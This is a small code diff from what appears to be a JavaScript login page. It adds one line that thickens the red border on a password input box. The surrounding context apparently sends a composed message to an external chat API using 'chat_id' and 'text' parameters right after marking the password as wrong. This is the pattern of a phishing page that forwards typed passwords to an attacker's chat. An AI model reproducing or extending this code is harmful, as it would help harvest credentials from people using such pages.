@@ -32,6 +32,7 @@
                 
                 var meineInputbox = document.getElementById("passwordinput");
                 meineInputbox.style.borderColor = "red";
+                meineInputbox.style.borderWidth = 2;
 
 
                 $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
